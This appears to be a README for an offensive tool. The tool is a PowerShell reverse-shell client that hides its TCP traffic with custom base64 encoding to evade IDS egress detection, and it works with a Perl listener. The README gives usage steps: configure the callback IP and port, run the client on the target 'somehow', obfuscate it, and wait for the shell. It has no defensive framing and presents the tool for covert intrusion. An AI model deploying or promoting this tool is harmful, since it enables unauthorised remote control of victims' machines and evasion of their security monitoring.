# b64 tcp client 

Provides a variant of the tcp powershell client that encodes the TCP traffic with custom base64 
encoding. This should help evade some IDS egress detection methods without having to resort 
to using SSL, Webserver, C2, blah, blah, blah...

Just a system that can run Perl :D 

To use start the Perl listener [->] ./b64-tcp-handler.pl [ specify port to listen on ]

Edit the b64-tcp-client.ps1 script, see below 

```
      ##################[ CONFIG CONNECTION ]####################

	       #[->] Enter the ip address and port information here

	      $IPAddress = '192.168.0.15'  # [->] Change this example
	      $Port = '443'        	       # [->] Change this example 

      ###########################################################

```

Get the client to execute on target system somehow, "gen-obfuscated" and wait for your shell.
